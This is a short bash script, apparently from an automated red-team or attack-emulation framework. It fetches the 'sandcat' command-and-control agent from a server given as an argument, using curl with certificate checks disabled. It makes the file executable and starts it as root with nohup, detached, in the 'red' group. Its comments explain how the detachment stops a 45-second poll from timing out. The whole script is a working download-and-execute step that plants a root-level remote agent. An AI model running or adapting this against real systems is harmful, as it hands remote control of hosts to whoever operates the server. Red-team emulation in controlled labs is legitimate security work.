server="$1";
agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
dir=$(pwd);
# Trailing >/dev/null 2>&1 redirects the `su -c` shell's OWN fds. That shell backgrounds the agent and
# then lingers (a util-linux su - behaviour) holding whatever it inherited; if that's the command's
# output pipe, sandcat never sees EOF and Incalmo's 45s poll times out. Pointing it at /dev/null frees
# the pipe so the command returns immediately. (The agent itself is already detached via nohup + /dev/null.)
su - root -c "cd $dir && nohup ./$agent -server $server -group red >/dev/null 2>&1 &" >/dev/null 2>&1